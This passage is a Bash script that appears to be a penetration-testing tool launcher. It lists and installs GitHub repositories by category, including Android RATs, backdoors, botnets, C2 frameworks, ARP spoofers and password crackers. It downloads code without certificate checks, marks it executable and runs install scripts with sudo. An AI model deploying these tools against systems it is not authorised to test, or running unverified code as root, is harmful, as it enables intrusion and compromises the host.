#!/bin/bash

#Author: Fabio Defilippo
#email: 4starfds@gmail.com

ENTSSL="https://github.com/"
ENTRAW="https://raw.githubusercontent.com/"
ENTLAB="https://gitlab.com/"
RQRM="/requirements.txt"
COL=$(tput cols)
ALN=$(($COL / 3))
SEP=$(for (( I=0 ; I<$COL ; I++ )); do printf '_'; done)
ALD="/storage/emulated/legacy/Download/"
AZD="/storage/emulated/0/Download/"
RLS="/releases"
RLDW="$RLS""/download"
WBE="For a better experience, please install "
FMSG="press ENTER to continue..."
MIP="0.0.0.0"
MPRT="80"
TIP="0.0.0.0"
TPRT="80"
TURL="http://0.0.0.0"
TUSRN=""
TPSSW=""
WORDLIST=""
TDOM=""
SANON=""
USERAGENT=""
COOKIE=""
ANON="Disabled"
SECL="$ENTRAW""danielmiessler/SecLists/master/"
DISC="Discovery/Web-Content/"
GHWPL=("CMS/wordpress.fuzz.txt" "CMS/wp-plugins.fuzz.txt" "CMS/wp-themes.fuzz.txt" "URLs/urls-wordpress-3.3.1.txt")
APACH=("Apache.fuzz.txt" "ApacheTomcat.fuzz.txt" "apache.txt" "tomcat.txt")
DIRLIST="directory-list-1.0.txt directory-list-2.3-big.txt directory-list-2.3-medium.txt directory-list-2.3-small.txt"

function ScaricaIn
{
	if [[ -d "$ALD" ]];
	then
		wget --no-check-certificate "$1" -O "$ALD""$2"
	elif [[ -d "$AZD" ]];
	then
		wget --no-check-certificate "$1" -O "$AZD""$2"
	else
		ls /storage
		echo "Digit where download, remember the slash at the end of the path"
		read -e -p "(example, /storage/emulated/legacy/Download/): " ATD
		if [[ -d "$ATD" ]];
		then
			wget --no-check-certificate "$1" -O "$ATD""$2"
		fi
	fi
	echo "Downloaded ""$2"
}

function NSEgo
{
	Clona "$1"
	echo "Do you want copy nse script in nmap /usr/share/nmap/scripts"
	read -p "(Y/n, default n): " RSP
	if [[ "$RSP" == "Y" ]];
	then
		cp $1/*.nse /usr/share/nmap/scripts/
	fi
	RSP=""
}

function Installa
{
	echo "This utility will try to install your chosen repo. Digit the repo folder without slash '/'"
	ls
	read -e -p "(example, myrepo): " REPO
	if [[ "$REPO" != "" ]];
	then
		if [[ -d "$REPO""/" ]];
		then
			cd "$REPO""/"
			if [[ -f ./install ]];
			then
				sudo ./install
			elif [[ -f "$RQRM" ]];
			then
				pyp3="0"
				if [[ $(grep "python3" *.py) != "" ]];
				then
					pyp3="1"
					sudo pip3 install -r "$RQRM"
				else
					sudo pip install -r "$RQRM"
				fi
				if [[ -f ./setup.py ]];
				then
					if [[ "$pyp3" == "1" ]];
					then
						sudo pip3 ./setup.py install
					else
						sudo pip ./setup.py install
					fi
				fi
			elif [[ -f ./Makefile ]];
			then
				sudo make && sudo make install
				cd ..
			elif [[ -f ./Gemfile ]];
			then
				sudo bundle install
				cd ..
			elif [[ $(ls *.go) != "" ]];
			then
				select GOO in $(ls *.go)
				do
				if [[ "$GOO" != "" ]];
				then
					go build "$GOO"
				fi
				break
				done
			else
				echo "I can not install this repo. Please, try you manually"
				if [[ -f ./README.md ]];
				then
					echo "Do you want open README.md file to help you?"
					read -p "Y/n (default n): " -i "n" RESP
					if [[ "$RESP" == "Y" ]];
					then
						less ./README.md
					fi
				fi
			fi
			cd ..
		fi
	fi
}

function ClonaLab
{
	git clone "$ENTLAB""$1"".git"
}

function Clona
{
	DKF="Dockerfile"
	echo "Choose what version you want to download ""$1"
	echo "0. back"
	if [[ $(wget -q -S --spider "$ENTRAW""$1""/master/""$DKF" 2>&1) == *"200 OK"* || $(wget -q -S --spider "$ENTRAW""$1""/main/""$DKF" 2>&1) == *"200 OK"* ]];
	then
		echo "1. Dockerfile"
	fi
	ENTFRM="$ENTSSL""$1""$RLDW""/"
	GRDS=$(lynx -dump -listonly "$ENTSSL""$1""$RLS"|grep "$RLDW"|awk '{print $2}'| while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
	if [[ "$GRDS" != "" ]];
	then
		echo "2. Release"
	fi
	echo "3. Clone"
	if [[ $(wget -q -S --spider "$ENTRAW""$1""/master/README.md" 2>&1) == *"200 OK"* || $(wget -q -S --spider "$ENTRAW""$1""/main/README.md" 2>&1) == *"200 OK"* ]];
	then
		echo "4. read the README.md file"
	fi
	read -p "(default 0): " -i "0" CVR
	case "$CVR" in
	"1")
		echo "Do you want to build this docker image? If not, it will be downloaded the Dockerfile"
		read -p "(Y/n, default n): " -i "n" RSP
		if [[ "$RSP" == "Y" ]];
		then
			docker build -t $(echo -n "$1" | awk -F "/" '{print $2}') "$ENTSSL""$1"".git"
		else
			if [[ $(wget -q -S --spider "$ENTRAW""$1""/master/""$DKF" 2>&1) == *"200 OK"* ]];
			then
				Scarica "$ENTRAW""$1""/master/""$DKF" "$DKF"
			else
				if [[ $(wget -q -S --spider "$ENTRAW""$1""/main/""$DKF" 2>&1) == *"200 OK"* ]];
				then
					Scarica "$ENTRAW""$1""/main/""$DKF" "$DKF"
				else
					echo "This repo has not a Dockerfile, please choose another version"
				fi
			fi
		fi
	;;
	"2")
		if [[ -f $(which lynx) ]];
		then
			if [[ "$GRDS" != "" ]];
			then
				select GRD in $GRDS
				do
					if [[ "$GRD" != "" ]];
					then
						Scarica "$ENTFRM""$GRD"
					else
						break
					fi
				done
			else
				echo "This repo has not a release, please choose another version"
			fi
		fi
	;;
	"3")
		git clone "$ENTSSL""$1"".git"
	;;
	"4")
		if [[ -f $(which mdless) ]];
		then
			LESS="mdless"
		else
			LESS="less"
		fi
		if [[ $(wget -q -S --spider "$ENTRAW""$1""/master/README.md" 2>&1) == *"200 OK"* ]];
		then
			curl -s -k -L "$ENTRAW""$1""/master/README.md" | $LESS
		elif [[ $(wget -q -S --spider "$ENTRAW""$1""/main/README.md" 2>&1) == *"200 OK"* ]];
		then
			curl -s -k -L "$ENTRAW""$1""/main/README.md" | $LESS
		else
			echo "There is not any README.md file"
		fi
	;;
	*)
	;;
	esac
}

function Controlla
{
	if [[ "$ANON" == "Enabled" ]];
	then
		curl -s -k -L -I --socks5 "$SANON" "$1"
	else
		wget --no-check-certificate --spider "$1"
	fi
}

function ScaricaWL
{
	if [[ "$ANON" == "Enabled" ]];
	then
		curl -s -k -L --socks5 "$SANON" "$1"
	else
		wget --no-check-certificate "$1" -O -
	fi
}

function Scarica
{
	if [[ "$ANON" == "Enabled" ]];
	then
		if [[ "$2" != "" ]];
		then
			curl -s -k -L --socks5 "$SANON" "$1" -o "$2"
		else
			QUESTO="./"$(echo "$1" | awk -F "/" '{print $NF}')
			curl -s -k -L --socks5 "$SANON" "$1" -o "$QUESTO"
			chmod +x "$QUESTO"
		fi
	else
		if [[ "$2" != "" ]];
		then
			wget --no-check-certificate "$1" -O "$2"
			chmod +x "./""$2"
		else
			wget --no-check-certificate "$1"
			chmod +x "./"$(echo "$1" | awk -F "/" '{print $NF}')
		fi
	fi
}

function Warning
{
	read -p $'WARNING: this repo is not verified! Do you want download it anyway?\nY/n (default n) ' -i "n" RSP
	if [[ "$RSP" != "" ]];
	then
		echo "$RSP"
	fi
}

function Stampa
{
	if [[ $COL -gt 121 ]];
	then
		if [[ "$3" != "" ]];
		then
			printf '%-'$ALN's%-'$ALN's%-'$ALN's' "$1" "$2" "$3"
			echo ""
		else
			if [[ "$2" != "" ]];
			then
				printf '%-'$ALN's%-'$ALN's' "$1" "$2"
				echo ""
			else
				echo "$1"
			fi
		fi
	else
		echo " $1"
		echo " $2"
		echo " $3"
	fi
}

for TOOL in "lynx" "tput" "git" "strace" "ltrace" "hydra" "nmblookup" "rlogin" "docker" "john" "gzip" "mdless" "bettercap"
do
	if [[ ! -f $(which $TOOL) ]];
	then
		echo "$WBE""$TOOL"
		read -p "$FMSG"
	fi
done

if [[ $COL -lt 122 ]];
then
	echo "||||||||||||||||||||||||||||||||||||||||||||||||||||||||"
	echo "||||||||00||||||00||00||||00||00||00||00|||||00|||||||||"
	echo "||||||||00||||||00||0000||00||00||00||||00|00|||||||||||"
	echo "||||||||00||||||00||00||0000||00||00|||||00|||||||||||||"
	echo "||||||||00||||||00||00||||00||00||00||||00|00|||||||||||"
	echo "||||||||000000||00||00||||00||000000||00|||||00|||||||||"
	echo "||||||||||||||||||||||||||||||||||||||||||||||||||||||||"
	echo "||||||||||||||||||||||||||||||||||||||||||||||||||||||||"
	echo "|||||||||||||||||000000||00||||||00|||||||||||||||||||||"
	echo "|||||||||||||||||00||00||00||||||00|||||||||||||||||||||"
	echo "|||||||||||||||||000000||00||||||00|||||||||||||||||||||"
	echo "|||||||||||||||||00||00||00||||||00|||||||||||||||||||||"
	echo "|||||||||||||||||00||00||000000||000000|||||||||||||||||"
	echo "||||||||||||||||||||||||||||||||||||||||||||||||||||||||"
	echo "||||||||||||||||||||||||||||||||||||||||||||||||||||||||"
	echo "||000000||000000||00||||||00||00000000||000000||000000||"
	echo "||00||00||00||||||0000||0000||00||||00||||00||||00||||||"
	echo "||000000||000000||00||00||00||00||||00||||00||||000000||"
	echo "||0000||||00||||||00||||||00||00||||00||||00||||00||||||"
	echo "||00||00||000000||00||||||00||00000000||||00||||000000||"
	echo "||||||||||||||||||||||||||||||||||||||||||||||||||||||||"
else
	echo "|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||"
	echo "||00||||||00||00||||00||00||00||00|||||00||000000||00||||||00||||||000000||000000||00||||||00||00000000||000000||000000||"
	echo "||00||||||00||0000||00||00||00||||00|00||||00||00||00||||||00||||||00||00||00||||||0000||0000||00||||00||||00||||00||||||"
	echo "||00||||||00||00||0000||00||00|||||00||||||000000||00||||||00||||||000000||000000||00||00||00||00||||00||||00||||000000||"
	echo "||00||||||00||00||||00||00||00||||00|00||||00||00||00||||||00||||||0000||||00||||||00||||||00||00||||00||||00||||00||||||"
	echo "||000000||00||00||||00||000000||00|||||00||00||00||000000||000000||00||00||000000||00||||||00||00000000||||00||||000000||"
	echo "|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||"
fi

echo "by fabiodefilipposoftware"

CAA="[+]"
CAB="[+]"
CAC="[+]"
CAD="[+]"
CAE="[+]"
CAF="[+]"
CAG="[+]"
CAH="[+]"
CAI="[+]"
CAJ="[+]"
CAK="[+]"
CAL="[+]"
CAM="[+]"
CAN="[+]"
CAO="[+]"
CAP="[+]"
CAQ="[+]"
CAR="[+]"
CAS="[+]"
CAT="[+]"
CAU="[+]"
CAV="[+]"
CAW="[+]"
CAX="[+]"
CAY="[+]"
CAZ="[+]"
CBA="[+]"
CBB="[+]"
CBC="[+]"
CBD="[+]"
CBE="[+]"
CBF="[+]"
CBG="[+]"
CBH="[+]"
CBI="[+]"
CBJ="[+]"
CBK="[+]"
CBL="[+]"
CBM="[+]"
CBN="[+]"
CBO="[+]"
CBP="[+]"
CBQ="[+]"
CBR="[+]"
CBS="[+]"
CBT="[+]"
CBU="[+]"
CBV="[+]"
CBW="[+]"
CBX="[+]"
CBY="[+]"
CBZ="[+]"
CCA="[+]"
CCB="[+]"
CCC="[+]"
CCD="[+]"
CCE="[+]"
CCF="[+]"
CCG="[+]"
CCH="[+]"
CCI="[+]"
CCJ="[+]"
CCK="[+]"
CCL="[+]"
CCM="[+]"
CCN="[+]"
CCO="[+]"
CCP="[+]"
CCQ="[+]"
CCR="[+]"
CCS="[+]"
CCT="[+]"
CCU="[+]"
CCV="[+]"
CCW="[+]"
CCX="[+]"
CCY="[+]"
CCZ="[+]"
CDA="[+]"
CDB="[+]"
CDC="[+]"
CDD="[+]"
CDE="[+]"
CDF="[+]"
CDG="[+]"
CDH="[+]"
CDI="[+]"
CDJ="[+]"
CDK="[+]"
CDL="[+]"
CDM="[+]"
CDN="[+]"
CDO="[+]"
CDP="[+]"
CDQ="[+]"
CDR="[+]"
CDS="[+]"
CDT="[+]"
CDU="[+]"
CDV="[+]"
CDW="[+]"
CDX="[+]"
CDY="[+]"
CDZ="[+]"
CEA="[+]"
CEB="[+]"
CEC="[+]"
CED="[+]"
CEE="[+]"
CEF="[+]"
CEG="[+]"
CEH="[+]"
CEI="[+]"
CEJ="[+]"
CEK="[+]"
CEL="[+]"
CEM="[+]"
CEN="[+]"
CEO="[+]"
CEP="[+]"
CEQ="[+]"
CER="[+]"
CES="[+]"
CET="[+]"
CEU="[+]"
CEV="[+]"
CEW="[+]"
CEX="[+]"
CEY="[+]"
CEZ="[+]"
CFA="[+]"
CFB="[+]"
CFC="[+]"
CFD="[+]"
CFE="[+]"
CFF="[+]"
CFG="[+]"
CFH="[+]"
CFI="[+]"
CFJ="[+]"
CFK="[+]"
CFL="[+]"
CFM="[+]"
CFN="[+]"
CFO="[+]"
CFP="[+]"
CFQ="[+]"
CFR="[+]"
CFS="[+]"
CFT="[+]"
CFU="[+]"
CFV="[+]"
CFW="[+]"
CFX="[+]"
CFY="[+]"
CFZ="[+]"
CGA="[+]"
CGB="[+]"
CGC="[+]"
CGD="[+]"
CGE="[+]"
CGF="[+]"
CGG="[+]"
CGH="[+]"
CGI="[+]"
CGJ="[+]"
CGK="[+]"
CGL="[+]"
CGM="[+]"
CGN="[+]"
CGO="[+]"
CGP="[+]"
CGQ="[+]"
CGR="[+]"
CGS="[+]"
CGT="[+]"
CGU="[+]"
CGV="[+]"
CGW="[+]"
CGX="[+]"
CGY="[+]"
CGZ="[+]"
CHA="[+]"
CHB="[+]"
CHC="[+]"
CHD="[+]"
CHE="[+]"
CHF="[+]"
CHG="[+]"
CHH="[+]"
CHI="[+]"
CHJ="[+]"
CHK="[+]"
CHL="[+]"
CHM="[+]"
CHN="[+]"
CHO="[+]"
CHP="[+]"
CHQ="[+]"
CHR="[+]"
CHS="[+]"
CZZ="[+]"

while true; do
	echo "$SEP"
	echo "$CAA"" AA. ACTIVE DIRECTORY"
	if [[ "$CAA" == "[-]" ]];
	then
		Stampa " 27. Greenwolf/Spray" "229. DanMcInerney/icebreaker" "283. optiv/Talon"
		Stampa " 524. tothi/rbcd-attack/rbcd" "587. PaperMtn/lil-pwny" "793. fox-it/aclpwn.py"
		Stampa " 2448. ricardojoserf/adfsbrute" "1231. NetSPI/goddi" "1242. MartinIngesen/gpocrack"
		echo "$SEP"
	fi
	echo "$CAB"" AB. ACQUISITION"
	if [[ "$CAB" == "[-]" ]];
	then
		Stampa " 171. Silv3rHorn/ArtifactExtractor" "172. SekoiaLab/Fastir_Collector"
		echo "$SEP"
	fi
	echo "$CAC"" AC. AES"
	if [[ "$CAC" == "[-]" ]];
	then
		Stampa " 28. bfaure/AES-128_Cracker" "29. unicornsasfuel/keybrute"
		echo "$SEP"
	fi
	echo "$CAD"" AD. ANALIZING"
	if [[ "$CAD" == "[-]" ]];
	then
		Stampa " 142. saferwall/saferwall" "169. fireeye/flare-floss" "219. BinaryAnalysisPlatform/bap"
		Stampa " 220. angr/angr" "224. cogent/origami-pdf" "451. Ettercap/ettercap"
		Stampa " 797. CoreSecurity/Agafi" "804. EgeBalci/Amber" "805. bdcht/amoco"
		Stampa " 813. salls/angrop" "886. ReFirmLabs/binwalk" "887. bmaia/binwally"
		Stampa " 906. brompwnie/botb" "947. slimm609/checksec.sh" "963. coreos/clair"
		Stampa " 975. EgeBalci/Cminer" "2266. presidentbeef/brakeman" "1112. elfmaster/ecfs"
		Stampa " 1006. SpiderLabs/cribdrag" "1018. 504ensicsLabs/DAMM" "1041. spectresearch/detectem"
		Stampa " 1093. USArmyResearchLab/Dshell" "1104. dungtv543/Dutas" "1107. DynamoRIO/dynamorio"
		Stampa " 1115. jacob-baines/elfparser" "2307. rizinorg/rizin" "2373. visma-prodsec/confused"
		Stampa " 2409. asad1996172/Obfuscation-Detection" "2441. unipacker/unipacker" "1253. anchore/grype"
		Stampa " 1135. cysinfo/Exescan" "1137. tr3w/ExpImp-Lookup" "1163. nccgroup/featherduster"
		Stampa " 1170. keithjjones/fileintel" "1178. craigz28/firmwalker" "1250. wireghoul/graudit"
		Stampa " 1198. adtac/fssb" "1202. JackOfMostTrades/gadgetinspector" "1203. med0x2e/GadgetToJScript"
		Stampa " 2512. geohot/qira" "2513. JonathanSalwan/ROPgadget" "1287. trolldbois/python-haystack"
		Stampa " 2611. ochronasec/ochrona-cli" "1332. airbus-seclab/ilo4_toolbox" "1373. SideChannelMarvels/JeanGrey"
		Stampa " 1472. GoSecure/malboxes" "1493. platomav/MEAnalyzer" "1522. CoolerVoid/Mosca"
		Stampa " 1535. mitre/multiscanner" "1537. Neo23x0/munin"
		echo "$SEP"
	fi
	echo "$CAE"" AE. ANDROID - APK"
	if [[ "$CAE" == "[-]" ]];
	then
		Stampa " 128. xtiankisutsa/MARA_Framework" "274. yasoob/nrc-exporter" "277. mzfr/slicer"
		Stampa " 323. ASHWIN990/ADB-Toolkit" "326. metachar/PhoneSploit" "327. xtiankisutsa/twiga"
		Stampa " 373. wuseman/WBRUTER" "405. bkerler/android_universal" "2387. swagkarna/Rafel-Rat"
		Stampa " 410. mesquidar/adbsploit" "504. airbus-seclab/android_emuroot" "552. MobSF/Mobile-Security-Framework-MobSF"
		Stampa " 572. 1N3/ReverseAPK" "807. AndroBugs/AndroBugs_Framework" "808. androguard/androguard"
		Stampa " 809. Flo354/Androick" "816. rednaga/APKiD" "817. hexabin/APKStat"
		Stampa " 860. l0gan/backHack" "1043. DexPatcher/dexpatcher-tool" "1087. mwrlabs/drozer"
		Stampa " 2319. dwisiswant0/apkleaks" "2410. RealityNet/android_triage" "2411. androidmalware/android_hid"
		Stampa " 2413. anbud/DroidDucky" "2516. The404Hacking/AndroRAT" "2517. karma9874/AndroRAT"
		Stampa " 2518. AhMyth/AhMyth-Android-RAT" "2519. m301/rdroid" "2520. nyx0/Dendroid"
		Stampa " 2521. JohnReagan/i-spy-android" "2522. honglvt/TalentRAT" "2533. rscloura/Doldrums"
		Stampa " 2545. DivineSoftware/AutoRoot" "2566. 0x1CA3/AdbNet" "1366. flankerhqd/JAADAS"
		Stampa " 1417. nccgroup/LazyDroid"
		echo "$SEP"
	fi
	echo "$CAF"" AF. ANONYMIZATION"
	if [[ "$CAF" == "[-]" ]];
	then
		Stampa " 2229. htrgouvea/nipe" "2348. realgam3/pymultitor" "2350. torsocks/torsocks"
		Stampa " 2631. omer-dogan/kali-whoami"
		echo "$SEP"
	fi
	echo "$CAG"" AG. ANTI-FORENSICS - SECURITY"
	if [[ "$CAG" == "[-]" ]];
	then
		Stampa " 480. AndyCyberSec/direncrypt" "577. KuroLabs/stegcloak" "590. 1tayH/noisy"
		Stampa " 940. 0xPoly/Centry" "1208. GasparVardanyan/GCrypt" "1489. fgrimme/Matroschka"
		echo "$SEP"
	fi
	echo "$CAH"" AH. APACHE"
	if [[ "$CAH" == "[-]" ]];
	then
		Stampa " 278. mgeeky/tomcatWarDeployer" "280. hypn0s/AJPy" "829. mthbernardes/ARTLAS"
		Stampa " 2424. antonio-morales/Apache-HTTP-Fuzzing" "2571. knightm4re/tomcter"
		echo "$SEP"
	fi
	echo "$CAI"" AI. APPLE"
	if [[ "$CAI" == "[-]" ]];
	then
		Stampa " 644. Pr0x13/iDict" "645. foozzi/iCloudBrutter" "2325. gwatts/pinfinder"
		Stampa " 2322. Hacktivation/iOS-Hacktivation-Toolkit" "2323. dnikles/removeActivationLock" "2324. tuttarealstep/iUnlock"
		Stampa " 2477. XMCyber/MacHound" "1326. hackappcom/ibrute"
		echo "$SEP"
	fi
	echo "$CAJ"" AJ. ARP"
	if [[ "$CAJ" == "[-]" ]];
	then
		Stampa " 462. royhills/arp-scan" "582. byt3bl33d3r/arpspoof" "583. ammarx/ARP-spoofing/mmattack"
		Stampa " 786. dracipn/arp-cache-poisoning" "787. EONRaider/Arp-Spoofer" "788. EmreOvunc/ARP-Poisoning-Tool"
		Stampa " 827. Lab-Zjt/ARPTools" "828. ntrippar/ARPwner" "1401. k4m4/kickthemout"
		echo "$SEP"
	fi
	echo "$CAK"" AK. AWS"
	if [[ "$CAK" == "[-]" ]];
	then
		Stampa " 657. sa7mon/S3Scanner" "659. aljazceru/s3-bucket-scanner" "660. ankane/s3tk"
		Stampa " 661. bear/s3scan" "662. haroonawanofficial/Amazon-AWS-Hack" "663. nagwww/101-AWS-S3-Hacks"
		Stampa " 706. pbnj/s3-fuzzer" "850. VirtueSecurity/aws-extender-cli" "851. nccgroup/aws-inventory"
		Stampa " 852. jordanpotti/AWSBucketDump" "868. Voulnet/barq" "2290. nahamsec/lazys3"
		Stampa " 2415. digi.ninja/bucket_finder" "2416. nccgroup/s3_objects_check" "2417. duo-labs/cloudmapper"
		Stampa " 2418. NetSPI/aws_consoler" "2419. andresriancho/enumerate-iam" "2291. tomdev/teh_s3_bucketeers"
		Stampa " 2467. smaranchand/bucky" "2480. WeAreCloudar/s3-account-search" "2481. clario-tech/s3-inspector"
		Stampa " 2476. lightspin-tech/red-shadow" "2529. Netflix/chaosmonkey"
		echo "$SEP"
	fi
	echo "$CAL"" AL. AZURE"
	if [[ "$CAL" == "[-]" ]];
	then
		Stampa " 32. dirkjanm/ROADtools"
		echo "$SEP"
	fi
	echo "$CAM"" AM. BACKDOOR - SHELLCODE"
	if [[ "$CAM" == "[-]" ]];
	then
		Stampa " 409. tz4678/backshell" "565. AnonymousAt3/cyberdoor" "855. mrjopino/backcookie"
		Stampa " 856. dana-at-cp/backdoor-apk" "857. secretsquirrel/the-backdoor-factory" "858. Kkevsterrr/backdoorme"
		Stampa " 2237. mm0r1/exploits/php-json-bypass" "2238. mm0r1/exploits/php7-backtrace-bypass" "2239. mm0r1/exploits/master/php7-gc-bypass"
		Stampa " 861. giuliocomi/backoori" "1027. gitdurandal/dbd" "1083. Shellntel/backdoors"
		Stampa " 1056. Mr-Un1k0d3r/DKMC" "1073. TheWover/donut" "1084. emptymonkey/drinkme"
		Stampa " 2313. cribdragg3r/Alaris" "1206. byt3bl33d3r/gcat" "1229. razc411/GoBD"
		Stampa " 2551. ORCA666/EarlyBird" "2622. phath0m/JadedWraith" "1504. screetsec/Microsploit"
		echo "$SEP"
	fi
	echo "$CAN"" AN. BLUETOOTH"
	if [[ "$CAN" == "[-]" ]];
	then
		Stampa " 305. lucaboni92/BlueFuzz" "440. fO-000/bluescan" "447. MillerTechnologyPeru/hcitool"
		Stampa " 482. francozappa/knob" "505. joswr1ght/btfind" "899. olivo/BluPhish"
		Stampa " 918. virtualabs/btlejack" "919. conorpp/btproxy" "995. mikeryan/crackle"
		Stampa " 2602. nccgroup/Sniffle"
		echo "$SEP"
	fi
	echo "$CAO"" AO. BOT - AI"
	if [[ "$CAO" == "[-]" ]];
	then
		Stampa " 445. evilsocket/kitsune" "1144. BishopFox/eyeballer"
		echo "$SEP"
	fi
	echo "$CAP"" AP. BOTNET"
	if [[ "$CAP" == "[-]" ]];
	then
		Stampa " 773. UBoat-Botnet/UBoat" "2455. twitu/byob"
		echo "$SEP"
	fi
	echo "$CAQ"" AQ. BRAINF**K"
	if [[ "$CAQ" == "[-]" ]];
	then
		Stampa " 238. brain-lang/brainfuck" "239. fabianishere/brainfuck"
		echo "$SEP"
	fi
	echo "$CAR"" AR. C2 - CeC - Command and Control"
	if [[ "$CAR" == "[-]" ]];
	then
		Stampa " 499. hyp3rlinx/DarkFinger-C2" "500. nettitude/PoshC2" "502. sensepost/godoh"
		Stampa " 503. lu4p/ToRat" "602. nil0x42/phpsploit" "137. xtr4nge/FruityC2"
		Stampa " 2469. postrequest/link" "1496. Ne0nd0g/merlin"
		echo "$SEP"
	fi
	echo "$CAS"" AS. CARS"
	if [[ "$CAS" == "[-]" ]];
	then
		Stampa " 933. schutzwerk/CANalyzat0r" "2310. shipcod3/mazda_getInfo" "2311. P1kachu/talking-with-cars"
		Stampa " 2601. souravbaghz/CarPunk"
		echo "$SEP"
	fi
	echo "$CAT"" AT. CDN"
	if [[ "$CAT" == "[-]" ]];
	then
		Stampa " 971. MrH0wl/Cloudmare"
		echo "$SEP"
	fi
	echo "$CAU"" AU. CEC - HEC"
	if [[ "$CAU" == "[-]" ]];
	then
		Stampa " 939. nccgroup/CECster"
		echo "$SEP"
	fi
	echo "$CAV"" AV. CHAP"
	if [[ "$CAV" == "[-]" ]];
	then
		Stampa " 946. moxie0/chapcrack" "2590. sensepost/assless-chaps"
		echo "$SEP"
	fi
	echo "$CAW"" AW. CHAT ENCRYPTED"
	if [[ "$CAW" == "[-]" ]];
	then
		Stampa " 376. mjm918/python-AES-encryption-socket-secure-chat" "377. SusmithKrishnan/neuron"
		Stampa " 378. ludvigknutsmark/python-chat" "379. sathwikv143/Encrypted-Python-Chat" "380. osalpekar/Encrypted-Chat"
		Stampa " 381. LatrecheYasser/Secure-Python-Chat" "382. spec-sec/SecureChat"
		echo "$SEP"
	fi
	echo "$CAX"" AX. CHROMECAST"
	if [[ "$CAX" == "[-]" ]];
	then
		Stampa " 1402. thewhiteh4t/killcast"
		echo "$SEP"
	fi
	echo "$CAY"" AY. CISCO"
	if [[ "$CAY" == "[-]" ]];
	then
		Stampa " 463. Zapotek/cdpsnarf" "959. madrisan/cisco7crack" "2378. madrisan/cisco5crack"
		echo "$SEP"
	fi
	echo "$CAZ"" AZ. CLOUDFLARE"
	if [[ "$CAZ" == "[-]" ]];
	then
		Stampa " 966. SageHack/cloud-buster" "967. m0rtem/CloudFail" "968. mandatoryprogrammer/cloudflare_enum"
		Stampa " 969. eudemonics/cloudget" "973. greycatz/CloudUnflare"
		echo "$SEP"
	fi
	echo "$CBA"" BA. CLOUDS"
	if [[ "$CBA" == "[-]" ]];
	then
		Stampa " 658. SimplySecurity/SimplyEmail" "664. aquasecurity/cloudsploit" "911. Matrix07ksa/Brute_Force"
		Stampa " 970. projectdiscovery/cloudlist" "972. cloudsploit/scans"
		echo "$SEP"
	fi
	echo "$CBB"" BB. CMS"
	if [[ "$CBB" == "[-]" ]];
	then
		Stampa " 483. TheDevFromKer/CMS-Attack" "484. Dionach/CMSmap" "234. n4xh4ck5/CMSsc4n"
		Stampa " 976. FlorianHeigl/cms-explorer" "977. Tuhinshubhra/CMSeeK" "979. ajinabraham/CMSScan"
		Stampa " 980. wpscanteam/CMSScanner" "984. Intrinsec/comission" "1086. droope/droopescan"
		echo "$SEP"
	fi
	echo "$CBC"" BC. CORS"
	if [[ "$CBC" == "[-]" ]];
	then
		Stampa " 987. chenjj/CORScanner" "988. RUB-NDS/CORStest"
		echo "$SEP"
	fi
	echo "$CBD"" BD. CRACKING - GUESSING"
	if [[ "$CBD" == "[-]" ]];
	then
		Stampa " 80. magnumripper/JohnTheRipper" "81. truongkma/ctf-tools/John" "82. SySS-Research/Seth"
		Stampa " 83. s0md3v/Hash-Buster" "120. NetSPI/PS_MultiCrack" "41. shmilylty/cheetah"
		Stampa " 126. timbo05sec/autocrack" "127. igorMatsunaga/autoCrack" "247. mufeedvh/basecrack"
		Stampa " 475. MS-WEB-BN/h4rpy" "506. Aarif123456/passwordCracker" "507. GauthamGoli/rar-Password-Cracker/bruteforce"
		Stampa " 543. praetorian-inc/trident_0.1.3_linux_i386" "544. praetorian-inc/trident_0.1.3_linux_x86_64" "545. praetorian-inc/trident"
		Stampa " 563. Viralmaniar/Passhunt" "611. jmk-foofus/medusa" "612. openwall/john"
		Stampa " 630. beurtschipper/Depix" "632. x90skysn3k/brutespray" "762. f0cker/crackq"
		Stampa " 763. hashcrackq/Crackq" "811. PentesterES/AndroidPINCrack" "838. Tylous/Auto_EAP"
		Stampa " 924. webpwnized/byepass" "915. 1N3/BruteX" "912. glv2/bruteforce-luks"
		Stampa " 913. glv2/bruteforce-salted-openssl" "992. D4Vinci/Cr3dOv3r" "2380. frdmn/findmyhash"
		Stampa " 994. CoalfireLabs/crackHOR" "996. vnik5287/Crackq" "997. averagesecurityguy/crack"
		Stampa " 1003. DanMcInerney/creds.py" "1008. galkan/crowbar" "1017. Ekultek/Dagon"
		Stampa " 1019. SideChannelMarvels/Daredevil" "2296. s3inlc/hashtopolis" "2357. fireeye/gocrack"
		Stampa " 2425. skelsec/pypykatz" "1156. evilsocket/fang" "2466. hemp3l/sucrack"
		Stampa " 2494. hashtopolis/server" "1273. UltimateHackers/Hash-Buster" "2508. hellman/xortool"
		Stampa " 2505. KishanBagaria/padding-oracle-attacker" "2506. Ganapati/RsaCtfTool" "2507. ius/rsatool"
		Stampa " 1276. hashcat/hashcat-utils" "1286. trustedsec/hate_crack" "2595. navin-maverick/BruteBot"
		Stampa " 1541. MooseDojo/myBFF"
		echo "$SEP"
	fi
	echo "$CBE"" BE. CRAWLING - SPIDERING - SCRAPING"
	if [[ "$CBE" == "[-]" ]];
	then
		Stampa " 586. saeeddhqan/evine" "722. OWASP/OWASP-WebScarab" "733. gotr00t0day/spider00t"
		Stampa " 938. lgandx/CCrawlDNS" "941. lanrat/certgraph" "2341. Pinperepette/whistory"
		Stampa " 1014. chamli/CyberCrowl" "1029. kgretzky/dcrawl" "2287. galkan/mail-crawl"
		Stampa " 2370. spatie/mixed-content-scanner" "1075. maurosoria/dirsearch" "1131. saeeddhqan/evine"
		Stampa " 1237. s0md3v/goop" "1241. jaeles-project/gospider" "1258. 00xc/h2buster"
		Stampa " 1230. OJ/gobuster" "2498. blacklanternsecurity/MANSPIDER" "1268. hakluke/hakrawler"
		echo "$SEP"
	fi
	echo "$CBF"" BF. CSRF - XSRF - SSRF"
	if [[ "$CBF" == "[-]" ]];
	then
		Stampa " 406. 0xInfection/XSRFProbe" "2278. s0md3v/Bolt" "1141. Damian89/extended-ssrf-search"
		Stampa " 2493. pinata-csrf-tool" "2523. google.com/pinata-csrf-tool"
		echo "$SEP"
	fi
	echo "$CZZ"" ZZ. CVE LIST"
	if [[ "$CZZ" == "[-]" ]];
	then
